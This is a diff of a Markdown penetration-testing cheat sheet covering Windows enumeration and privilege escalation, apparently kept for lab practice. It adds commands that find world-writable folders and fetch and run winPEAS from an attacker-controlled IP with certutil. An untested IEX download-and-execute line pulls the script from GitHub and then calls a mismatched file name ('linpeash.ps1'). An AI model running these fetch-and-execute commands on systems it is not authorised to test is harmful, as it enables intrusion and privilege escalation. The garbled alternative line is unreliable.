@@ -62,12 +62,16 @@ Devices: `Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, Driver
 Drivers: `driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object "Display Name", "Start Mode", "Path"`
 Shadow Copy: `vssadmin list shadows`, `mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\`
 # PrivEsc
-##### Find Working Dir for attack
+##### Find Working Dir for attack, if not \\Users\\Public
 ```powershell
 Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
 ```
 	
 ##### WinPEAS
+```powershell
+cd \Users\Public ; certutil.exe -urlcache -split -f "http://192.168.45.189:8181/winPEASx64.exe" ; winPEASx64.exe
+```
+Alternative (not tested yet):
 ```bash
 IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1'); ./linpeash.ps1 -a -r | tee linpeas.txt
 ```
